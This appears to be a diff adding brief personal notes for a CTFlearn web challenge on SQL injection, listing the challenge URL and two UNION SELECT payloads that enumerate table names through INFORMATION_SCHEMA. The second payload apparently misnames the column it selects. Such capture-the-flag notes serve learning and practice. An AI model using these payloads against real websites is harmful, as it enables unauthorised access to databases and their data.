@@ -1,1 +1,12 @@
 UNION Attack
+
+Site : http://web.ctflearn.com/web8/
+
+INFORMATION_SCHEMA.TABLES
+Check table name from information schema table
+
+INFORMATION_SCHEMA.COLUMNS
+Check column name from information schema table
+
+1 union select table_name,2,3,4 from information_schema.tables
+1 union select table_name,2,3,4 from information_schema.columns
